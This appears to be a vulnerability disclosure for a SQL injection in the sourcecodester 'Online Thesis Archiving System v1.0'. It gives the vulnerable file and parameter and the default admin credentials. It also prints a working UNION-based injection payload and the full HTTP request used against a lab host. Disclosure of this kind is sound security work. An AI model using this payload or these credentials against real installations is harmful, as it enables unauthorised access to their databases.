# Online Thesis Archiving System v1.0 by sourcecodester has SQL injection 1

BUG_Author: huliangjia

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/15083/online-thesis-archiving-system-using-phpoop-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /otas/view_archive.php

Vulnerability location: /otas/?page=view_archive&id=, id

dbname = otas_db

[+] Payload: /otas/?page=view_archive&id=0%27%20union%20select%201,2,3,4,database(),6,7,8,9,10,11,12,13--+ // Leak place ---> id

```sql
GET /otas/?page=view_archive&id=0%27%20union%20select%201,2,3,4,database(),6,7,8,9,10,11,12,13--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=rpf8v4l0kpm50v3jmb8tlle30e
Connection: close

```

<img width="1518" height="816" alt="image" src="https://github.com/user-attachments/assets/64ffd7f8-2058-4384-a820-16335ae77a6f" />
